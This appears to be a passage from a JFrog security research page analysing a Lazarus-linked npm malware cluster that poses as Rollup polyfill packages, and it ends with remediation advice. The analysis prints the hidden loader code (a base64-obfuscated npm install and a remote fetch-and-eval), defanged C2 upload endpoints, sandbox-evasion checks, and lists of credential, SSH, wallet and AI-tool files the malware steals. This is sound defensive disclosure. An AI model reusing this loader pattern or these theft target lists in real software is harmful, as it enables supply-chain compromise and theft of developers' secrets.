+powershell -NoProfile -Command "Get-CimInstance Win32_LogicalDisk | Select-Object -ExpandProperty DeviceID"
+</code></pre>
+</section><!----></div></div></div></main><footer class="py-4 main-footer bg-black dark:bg-gray-950"><div class="container mx-auto px-2"><div class="flex w-full justify-center flex-col sm:flex-row sm:justify-between items-center flex-wrap gap-4"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a></div></div><div class="right"><ul class="footer-menu flex flex-col sm:flex-row items-center"><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/terms-of-use/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Terms of Use
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/jfrog-cookies-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Cookies Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/privacy-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Privacy Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="#" rel="noopener noreferrer" target="_self" class="text-white ot-sdk-show-settings">
+              Cookies Settings
+            </a></li></ul></div></div><p class="sm:hidden text-center text-white pt-3">
+      ©2026 All Rights Reserved. JFrog Ltd.
+    </p></div></footer></div>
+    <script>window.__INITIAL_STATE__={"data":{"realTimePost":{"description":"Yair Benamou, JFrog Security Researcher","title":"Lazarus-Linked npm Malware Masquerades as Rollup Polyfills","date":"June 30, 2026","type":"realTimePost","tag":"Real Time Post","img":"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Frollup-polyfill-masquerading-hero.png","path":"\u002Fpost\u002Frollup-polyfill-masquerading\u002F","content":"\u003Cp\u003EThe JFrog Security research team identified a malicious npm package cluster masquerading as Rollup polyfill tooling. The two entry packages, \u003Ccode\u003Erollup-packages-polyfill-core\u003C\u002Fcode\u003E and \u003Ccode\u003Erollup-runtime-polyfill-core\u003C\u002Fcode\u003E, imitate the naming, README content, repository metadata, and package shape of the legitimate \u003Ca href=\"https:\u002F\u002Fwww.npmjs.com\u002Fpackage\u002Frollup-plugin-polyfill-node\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003E\u003Ccode\u003Erollup-plugin-polyfill-node\u003C\u002Fcode\u003E\u003C\u002Fa\u003E project.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Frollup-polyfill-masquerading-hero.png\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe legitimate package is widely used in the JavaScript build ecosystem, with \u003Cstrong\u003E~295K weekly downloads\u003C\u002Fstrong\u003E for \u003Ccode\u003Erollup-plugin-polyfill-node\u003C\u002Fcode\u003E and more than \u003Cstrong\u003E1.2M downloads in the last month\u003C\u002Fstrong\u003E. The lookalike packages place themselves in the same \u003Ccode\u003Erollup\u003C\u002Fcode\u003E, \u003Ccode\u003Epolyfill\u003C\u002Fcode\u003E, \u003Ccode\u003Ecore\u003C\u002Fcode\u003E, and \u003Ccode\u003Enode\u003C\u002Fcode\u003E naming space, which can look plausible during a quick dependency review.\u003C\u002Fp\u003E\n\u003Ch2 id=\"affected-packages\"\u003E\u003Ca href=\"#affected-packages\" aria-hidden=\"true\" tabindex=\"-1\"\u003EAffected Packages\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EDuring the investigation, we observed six npm packages:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Erollup-packages-polyfill-core\nrollup-runtime-polyfill-core\nswift-parse-stream\nquirky-token\nreact-icon-svgs\nrollup-plugin-polyfill-connect\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EAt the time of writing, \u003Ccode\u003Erollup-plugin-polyfill-connect\u003C\u002Fcode\u003E and \u003Ccode\u003Ereact-icon-svgs\u003C\u002Fcode\u003E had received security-holding versions on npm, while the other four malicious packages were still live.\u003C\u002Fp\u003E\n\u003Cp\u003EThe first two packages are the Rollup-themed entry points. \u003Ccode\u003Erollup-packages-polyfill-core\u003C\u002Fcode\u003E installs and loads \u003Ccode\u003Eswift-parse-stream\u003C\u002Fcode\u003E; \u003Ccode\u003Erollup-runtime-polyfill-core\u003C\u002Fcode\u003E installs and loads \u003Ccode\u003Equirky-token\u003C\u002Fcode\u003E. The second-stage packages are near-identical SVG utilities that fetch a JSON object from JSONKeeper and \u003Ccode\u003Eeval\u003C\u002Fcode\u003E the \u003Ccode\u003Emodel\u003C\u002Fcode\u003E field.\u003C\u002Fp\u003E\n\u003Cp\u003EWe observed the same staging pattern with \u003Ccode\u003Ereact-icon-svgs\u003C\u002Fcode\u003E, which installed \u003Ccode\u003Erollup-plugin-polyfill-connect\u003C\u002Fcode\u003E as a second stage. This layered structure, together with the lookalike names, legitimate-looking metadata, hidden install-time execution, environment checks, and credential-theft\u002Fremote-access payloads, is similar to previous North Korean Lazarus-linked npm campaigns. The key differentiator is the payload deployment method, which we analyze in detail below.\u003C\u002Fp\u003E\n\u003Ch2 id=\"package-masquerading\"\u003E\u003Ca href=\"#package-masquerading\" aria-hidden=\"true\" tabindex=\"-1\"\u003EPackage Masquerading\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EBoth Rollup-themed packages copy most of the legitimate \u003Ccode\u003Erollup-plugin-polyfill-node\u003C\u002Fcode\u003E surface:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EThe README text describes \"A modern Node.js polyfill for your Rollup bundle.\" \u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Frollup-polyfill-masquerading-npm.png\"\u003E\u003C\u002Fli\u003E\n\u003Cli\u003EThe repository and homepage point to \u003Ccode\u003Ehttps:\u002F\u002Fgithub.com\u002FFredKSchott\u002Frollup-plugin-polyfill-node\u003C\u002Fcode\u003E.\u003C\u002Fli\u003E\n\u003Cli\u003EThe package entry point contains legitimate-looking Rollup polyfill plugin code before the malicious logic.\u003C\u002Fli\u003E\n\u003Cli\u003EIn the samples, only the CommonJS \u003Ccode\u003Edist\u002Findex.js\u003C\u002Fcode\u003E entry point is backdoored; the ESM \u003Ccode\u003Edist\u002Fes\u002Findex.js\u003C\u002Fcode\u003E files do not contain the appended install-and-load routine.\u003C\u002Fli\u003E\n\u003Cli\u003EThe names remain close to the legitimate project without being exact typos.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"end-to-end-malware-flow\"\u003E\u003Ca href=\"#end-to-end-malware-flow\" aria-hidden=\"true\" tabindex=\"-1\"\u003EEnd-to-End Malware Flow\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EPutting the pieces together, the infection chain looks like this:\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fpolyfill-masquerading-flow.png\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe two entry packages differ mainly in the second-stage package they install. After that, both routes converge on the same JSONKeeper payload.\u003C\u002Fp\u003E\n\u003Ch2 id=\"hidden-install-step\"\u003E\u003Ca href=\"#hidden-install-step\" aria-hidden=\"true\" tabindex=\"-1\"\u003EHidden Install Step\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe malicious logic is appended to otherwise plausible Rollup plugin code. In \u003Ccode\u003Erollup-packages-polyfill-core\u003C\u002Fcode\u003E, the import-time install routine is hidden behind benign-looking SVG validation names:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Econst ValidateSvgModule = () =\u003E {\n  const CMD = Buffer.from(\"bnBtIGluc3RhbGwgc3dpZnQtcGFyc2Utc3RyZWFtIC0tbm8tc2F2ZSAtLXNpbGVudCAtLW5vLWF1ZGl0IC0tbm8tZnVuZA==\", \"base64\").toString(\"utf8\");\n  const [cmd, ...args] = CMD.split(' ');\n  const child = spawn(cmd, args, {\n    stdio: 'ignore',\n    shell: process.platform === 'win32',\n    windowsHide: true\n  });\n};\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe base64 string in \u003Ccode\u003ECMD\u003C\u002Fcode\u003E decodes to:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Enpm install swift-parse-stream --no-save --silent --no-audit --no-fund\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe package then decodes the module name \u003Ccode\u003Eswift-parse-stream\u003C\u002Fcode\u003E, requires it, retrieves \u003Ccode\u003EgetPlugin()\u003C\u002Fcode\u003E, and invokes the returned function.\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Econst MODULE_NAME = Buffer.from('c3dpZnQtcGFyc2Utc3RyZWFt', 'base64').toString('utf8');\nconst checkPlugin = () =\u003E {\n  try {\n    const svgo = require(MODULE_NAME);\n    const plugin = svgo.getPlugin();\n    if (plugin) {\n      const svgData = '';\n      plugin();\n    }\n  } catch (error) {\n  }\n};\nValidateSvgModule();\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Ccode\u003Erollup-runtime-polyfill-core\u003C\u002Fcode\u003E uses the same pattern to install \u003Ccode\u003Equirky-token\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EThis makes the infection happen when the package is imported as part of a build or configuration flow.\u003C\u002Fp\u003E\n\u003Ch2 id=\"jsonkeeper-loader\"\u003E\u003Ca href=\"#jsonkeeper-loader\" aria-hidden=\"true\" tabindex=\"-1\"\u003EJSONKeeper Loader\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003E\u003Ccode\u003Eswift-parse-stream\u003C\u002Fcode\u003E and \u003Ccode\u003Equirky-token\u003C\u002Fcode\u003E present themselves as SVG sanitization utilities. Most of the file is harmless-looking SVG code: hashing content, removing \u003Ccode\u003E&#x3C;script\u003E\u003C\u002Fcode\u003E tags, minifying SVG text, and saving files.\u003C\u002Fp\u003E\n\u003Cp\u003EThe real behavior appears at the end of \u003Ccode\u003Eindex.js\u003C\u002Fcode\u003E:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Econst reqOptions = {\n  url: \"hxxps:\u002F\u002Fwww[.]jsonkeeper[.]com\u002Fb\u002F3P9BF\",\n  headers: {\n    bearrtoken: \"logo\"\n  }\n};\n\nfunction getPlugin() {\n  return function() {\n    request(reqOptions, (err, res, body) =\u003E {\n      if (err || res.statusCode !== 200) {\n      }\n\n      try {\n        const parsed = JSON.parse(body);\n        if (typeof parsed.model === \"string\") {\n          eval(parsed.model);\n        }\n      } catch (e) {\n      }\n    });\n  };\n}\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe JSONKeeper object contains a key named \u003Ccode\u003Emodel\u003C\u002Fcode\u003E, which contains an obfuscated JavaScript payload that is executed directly through \u003Ccode\u003Eeval\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fpolyfill-masquerading-code.png\"\u003E\u003C\u002Fp\u003E\n\u003Ch2 id=\"jsonkeeper-payload\"\u003E\u003Ca href=\"#jsonkeeper-payload\" aria-hidden=\"true\" tabindex=\"-1\"\u003EJSONKeeper Payload\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe JSONKeeper payload starts with environment checks. It exits in several hosted or cloud-like environments, including:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003ECODESPACE_NAME\nCODESANDBOX_HOST\nVERCEL\nAWS_EXECUTION_ENV\nAWS_REGION\nAWS_LAMBDA_FUNCTION_NAME\nAWS_ACCESS_KEY_ID\nGOOGLE_CLOUD_PROJECT\nAZURE_FUNCTIONS_ENVIRONMENT\nDOCKER\nRENDER\nGAE_ENV\nWEBSITE_SITE_NAME\nDYNO\nSOCKET_DEV\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EIt also checks whether the OS release string contains \u003Ccode\u003Eaws\u003C\u002Fcode\u003E. This looks like an attempt to avoid common sandboxes, cloud development environments, serverless runtimes, and analysis infrastructure.\u003C\u002Fp\u003E\n\u003Cp\u003EAfter the environment gate, the payload installs dependencies and downloads the next stage:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Enpm install axios socket.io-client --no-warnings --no-progress --loglevel silent\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EIt then requests:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Ehxxp[:]\u002F\u002F216[.]126[.]236[.]244\u002Fapi\u002Fservice\u002F98cb54c0b4ac259d30c9c1ca1ae87c68\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe response is formatted as \u003Ccode\u003E&#x3C;base64 IV\u003E:&#x3C;base64 ciphertext\u003E\u003C\u002Fcode\u003E and the payload derives an AES key with:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003Ecrypto.scryptSync(\"98cb54c0b4ac259d30c9c1ca1ae87c68\", \"salt\", 32)\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EIt decrypts the ciphertext with \u003Ccode\u003EAES-256-CBC\u003C\u002Fcode\u003E, writes the plaintext to \u003Ccode\u003E&#x3C;tmp\u003E\u002Fpack\u003C\u002Fcode\u003E, and executes \u003Ccode\u003Enode pack\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EDuring our analysis, the remote service was still live and we managed to retrieve the AES-wrapped JavaScript payload of roughly \u003Cstrong\u003E114 KB\u003C\u002Fstrong\u003E after decryption.\u003C\u002Fp\u003E\n\u003Ch2 id=\"remote-pack-stage\"\u003E\u003Ca href=\"#remote-pack-stage\" aria-hidden=\"true\" tabindex=\"-1\"\u003ERemote Pack Stage\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe decrypted \u003Ccode\u003Epack\u003C\u002Fcode\u003E stage is a loader for multiple JavaScript payloads. In a sandboxed run with file writes, network connections, and command execution stubbed out, it attempted to write and launch additional scripts under the temp directory:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003E&#x3C;tmp\u003E\u002Fscdata\n&#x3C;tmp\u003E\u002Fldata\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EIt also spawned payloads for file collection and clipboard monitoring, which were embedded inside a JSON file:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003E...\n    {\n      \"method\": \"exec\",\n      \"command\": \"npm i axios &#x26;&#x26; node ldata\",\n      \"options\": {\n        \"cwd\": \"\u002Ftmp\",\n        \"windowsHide\": true,\n        \"stdio\": \"ignore\"\n      }\n    },\n    {\n      \"method\": \"spawn\",\n      \"command\": \"node\",\n      \"argv\": [\n        \"-e\",\n        \"const m=b;function b(c,d){c=c-(0x9fa*0x1+-0x16e2*-0x1+-0x1ef3);const e=a();let f=e[c];return f;}(function(c,d){const......\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe parent launcher starts the dropped scripts with:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Enpm i axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent &#x26;&#x26; node scdata\nnpm i axios &#x26;&#x26; node ldata\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe recovered behavior splits into four main parts:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ccode\u003Escdata.js\u003C\u002Fcode\u003E: remote access and host-control component\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003Eldata.js\u003C\u002Fcode\u003E: browser and crypto-wallet data collection component\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003Eevents.json\u003C\u002Fcode\u003E file collector: broad filesystem discovery and upload\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003Eevents.json\u003C\u002Fcode\u003E clipboard watcher: periodic clipboard collection\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"remote-access-component\"\u003E\u003Ca href=\"#remote-access-component\" aria-hidden=\"true\" tabindex=\"-1\"\u003ERemote Access Component\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe \u003Ccode\u003Escdata\u003C\u002Fcode\u003E payload installs several runtime dependencies:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Enpm install socket.io-client ssh2 node-pty@1.0.0 --no-warnings --no-progress --loglevel silent\nnpm install socket.io-client ssh2 node-pty --no-warnings --no-progress --loglevel silent\nnpm install sharp screenshot-desktop clipboardy @nut-tree-fork\u002Fnut-js --no-warnings --no-progress --loglevel silent\nnpm install -g socket.io-client --save --no-warnings --no-save --no-progress --loglevel silent\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe unversioned \u003Ccode\u003Enode-pty\u003C\u002Fcode\u003E path and the screen\u002Finput packages are Windows-specific. The global \u003Ccode\u003Esocket.io-client\u003C\u002Fcode\u003E install is used as a fallback if the first Socket.IO setup path fails.\u003C\u002Fp\u003E\n\u003Cp\u003EThe payload uses Socket.IO to communicate with:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Ehxxp[:]\u002F\u002F216[.]126[.]236[.]244:4801\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EIt also posts host and log information to endpoints under:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Ehxxp[:]\u002F\u002F216[.]126[.]236[.]244\u002Fapi\u002Fservice\u002F\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe remote access component supports:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehost profiling with OS, release, hostname, user info, UID, and VM markers\u003C\u002Fli\u003E\n\u003Cli\u003EVM checks through Windows CIM, macOS \u003Ccode\u003Esystem_profiler\u003C\u002Fcode\u003E, Linux \u003Ccode\u003E\u002Fproc\u002Fcpuinfo\u003C\u002Fcode\u003E, and strings such as \u003Ccode\u003Evmware\u003C\u002Fcode\u003E, \u003Ccode\u003Evirtualbox\u003C\u002Fcode\u003E, \u003Ccode\u003Eqemu\u003C\u002Fcode\u003E, and \u003Ccode\u003Emicrosoft corporation\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003Cli\u003Ecommand execution through \u003Ccode\u003Echild_process.exec\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003Cli\u003Einteractive terminal sessions through \u003Ccode\u003Enode-pty\u003C\u002Fcode\u003E, using \u003Ccode\u003Epowershell.exe\u003C\u002Fcode\u003E on Windows and \u003Ccode\u003Ezsh\u003C\u002Fcode\u003E elsewhere\u003C\u002Fli\u003E\n\u003Cli\u003ESSH sessions through the \u003Ccode\u003Essh2\u003C\u002Fcode\u003E library\u003C\u002Fli\u003E\n\u003Cli\u003Eterminal resize and terminal input forwarding\u003C\u002Fli\u003E\n\u003Cli\u003EWindows-only screenshot capture through \u003Ccode\u003Escreenshot-desktop\u003C\u002Fcode\u003E and JPEG conversion through \u003Ccode\u003Esharp\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003Cli\u003EWindows-only mouse movement, clicks, scrolling, keyboard presses, and hotkeys through \u003Ccode\u003E@nut-tree-fork\u002Fnut-js\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003Cli\u003EWindows-only remote clipboard read and paste handling through \u003Ccode\u003Eclipboardy\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003Cli\u003Eprocess termination and single-instance tracking under a temp \u003Ccode\u003E.npm\u003C\u002Fcode\u003E directory, with a \u003Ccode\u003Evhost.ctl\u003C\u002Fcode\u003E process\u002FPID marker\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThis component gives the operator interactive control over the infected host, not just one-time data theft.\u003C\u002Fp\u003E\n\u003Ch2 id=\"browser-and-wallet-data-collection\"\u003E\u003Ca href=\"#browser-and-wallet-data-collection\" aria-hidden=\"true\" tabindex=\"-1\"\u003EBrowser And Wallet Data Collection\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe \u003Ccode\u003Eldata\u003C\u002Fcode\u003E payload targets browser profile data and crypto-wallet extension storage. It posts uploads to:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Ehxxp[:]\u002F\u002F216[.]126[.]236[.]244:4809\u002Fupload\nhxxp[:]\u002F\u002F216[.]126[.]236[.]244:4809\u002Fcldbs\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe payload checks common browser profile locations for Windows, macOS, and Linux, including Chrome, Edge, Brave, Opera, and LT Browser. It attempts to upload files such as:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003ELogin Data\nLogin Data For Account\nWeb Data\nLocal Extension Settings\u002F&#x3C;extension-id\u003E\u002F*\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EOn macOS, it also attempts to upload:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003E~\u002FLibrary\u002FKeychains\u002Flogin.keychain-db\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe extension ID list includes widely used wallet and browser-extension storage locations. Recovered IDs include known wallets such as MetaMask:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Enkbihfbeogaeaoehlefnkodbefgpgknn\nbfnaelmomeimhlpmgjnjophhpkkoljpa\nfhbohimaelbohpjbbldcngcnapndodjp\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe collection logic copies extension storage into a temporary directory before upload, and it repeatedly checks some LevelDB paths until the server acknowledges them.\u003C\u002Fp\u003E\n\u003Ch2 id=\"broad-file-collection\"\u003E\u003Ca href=\"#broad-file-collection\" aria-hidden=\"true\" tabindex=\"-1\"\u003EBroad File Collection\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EOne inline \u003Ccode\u003Enode -e\u003C\u002Fcode\u003E payload performs broad filesystem collection and uploads matching files to:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Ehxxp[:]\u002F\u002F216[.]126[.]236[.]244:4806\u002Fupload\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EIt recursively scans user directories while excluding common noisy or system directories such as \u003Ccode\u003Enode_modules\u003C\u002Fcode\u003E, caches, build output, package directories, app bundles, and OS folders. The deobfuscated collector handles \u003Ccode\u003E.git\u003C\u002Fcode\u003E specially: it skips the repository tree but uploads \u003Ccode\u003E.git\u002Fconfig\u003C\u002Fcode\u003E when present. It also contains platform-specific expansion logic: Windows logical disks are enumerated with \u003Ccode\u003EGet-CimInstance Win32_LogicalDisk\u003C\u002Fcode\u003E, Linux scans include \u003Ccode\u003E\u002Fmnt\u003C\u002Fcode\u003E, and macOS scans include \u003Ccode\u003E~\u002FLibrary\u002FApplication Support\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EThe collector specifically looks for editor history under:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003ECode\u002FUser\u002FHistory\nWindsurf\u002FUser\u002FHistory\nCursor\u002FUser\u002FHistory\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe filename and keyword targeting is broad. Recovered patterns include:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003E*.env*\n*.pem\n*.key\n*.secret\n*private key*\n*secret phrase*\n*metamask*\n*bitcoin*\n*btc*\n*solana*\n*.json\n*.txt\n*.csv\n*.doc\n*.docx\n*.xls\n*.xlsx\n*.pdf\n*.png\n*.jpg\n*.jpeg\n*.md\n*.rtf\n*.odt\n*.ini\n*.ts\n*.js\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EIt also includes common developer and AI-tool configuration locations such as:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003E.aws\n.azure\n.ssh\n.gnupg\n.config\n.foundry\n.vscode\n.cursor\n.windsurf\n.gemini\n.claude\n.bash_history\n.zsh_history\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThis makes the payload relevant to developer workstations and build machines, where API keys, SSH keys, wallet material, cloud credentials, and project secrets are often present.\u003C\u002Fp\u003E\n\u003Ch2 id=\"clipboard-monitoring\"\u003E\u003Ca href=\"#clipboard-monitoring\" aria-hidden=\"true\" tabindex=\"-1\"\u003EClipboard Monitoring\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EAnother inline payload monitors clipboard contents. It uses:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Epbpaste\npowershell -NoProfile -NonInteractive Get-Clipboard\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EWhen the clipboard changes, the payload sends the new value to:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Ehxxp[:]\u002F\u002F216[.]126[.]236[.]244\u002Fapi\u002Fservice\u002Fmakelog\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EClipboard monitoring is a common way to capture copied credentials, tokens, wallet addresses, seed phrases, and one-time secrets.\u003C\u002Fp\u003E\n\u003Ch2 id=\"the-risks\"\u003E\u003Ca href=\"#the-risks\" aria-hidden=\"true\" tabindex=\"-1\"\u003EThe Risks\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe risk is significant because the compromise sits inside build tooling. Rollup plugins are commonly loaded from local configuration files, developer workstations, and CI jobs. These environments often have access to sensitive assets such as source code, npm tokens, Git credentials, cloud keys, SSH keys, browser data, and project secrets.\u003C\u002Fp\u003E\n\u003Cp\u003EThe payload is also broader than a simple downloader. Once the later stages run, the attacker gains both collection and control capabilities. One payload collects browser and wallet data, another searches the filesystem for secrets, another monitors the clipboard, and the remote access component can run commands, open terminals, start SSH sessions, capture screenshots, and control input devices.\u003C\u002Fp\u003E\n\u003Ch2 id=\"detection-and-remediation\"\u003E\u003Ca href=\"#detection-and-remediation\" aria-hidden=\"true\" tabindex=\"-1\"\u003EDetection And Remediation\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003ERecommended actions for users who installed any of these malicious packages:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003ERemove \u003Ccode\u003Erollup-packages-polyfill-core\u003C\u002Fcode\u003E, \u003Ccode\u003Erollup-runtime-polyfill-core\u003C\u002Fcode\u003E, \u003Ccode\u003Eswift-parse-stream\u003C\u002Fcode\u003E, \u003Ccode\u003Equirky-token\u003C\u002Fcode\u003E, \u003Ccode\u003Ereact-icon-svgs\u003C\u002Fcode\u003E, and \u003Ccode\u003Erollup-plugin-polyfill-connect\u003C\u002Fcode\u003E from affected projects and lockfiles.\u003C\u002Fli\u003E\n\u003Cli\u003EInspect dependency trees for transitive pulls of \u003Ccode\u003Eswift-parse-stream\u003C\u002Fcode\u003E, \u003Ccode\u003Equirky-token\u003C\u002Fcode\u003E, or \u003Ccode\u003Erollup-plugin-polyfill-connect\u003C\u002Fcode\u003E.\u003C\u002Fli\u003E\n\u003Cli\u003ESearch developer machines and CI runners for \u003Ccode\u003Epack\u003C\u002Fcode\u003E, \u003Ccode\u003Escdata\u003C\u002Fcode\u003E, and \u003Ccode\u003Eldata\u003C\u002Fcode\u003E under temporary directories.\u003C\u002Fli\u003E\n\u003Cli\u003ESearch for command lines containing \u003Ccode\u003Enode pack\u003C\u002Fcode\u003E, \u003Ccode\u003Enode scdata\u003C\u002Fcode\u003E, \u003Ccode\u003Enode ldata\u003C\u002Fcode\u003E, or inline \u003Ccode\u003Enode -e\u003C\u002Fcode\u003E scripts connecting to \u003Ccode\u003E216.126.236.244\u003C\u002Fcode\u003E.\u003C\u002Fli\u003E\n\u003Cli\u003EBlock outbound communication to \u003Ccode\u003E216.126.236.244\u003C\u002Fcode\u003E and the JSONKeeper URL listed below.\u003C\u002Fli\u003E\n\u003Cli\u003ETreat affected machines as potentially compromised before rotating credentials.\u003C\u002Fli\u003E\n\u003Cli\u003ERotate npm, GitHub, cloud, SSH, package-registry, browser-stored, and wallet-related credentials after persistence and active processes are removed.\u003C\u002Fli\u003E\n\u003Cli\u003EAudit browsers for unexpected extension storage access and inspect developer configuration directories for data exposure.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"conclusion\"\u003E\u003Ca href=\"#conclusion\" aria-hidden=\"true\" 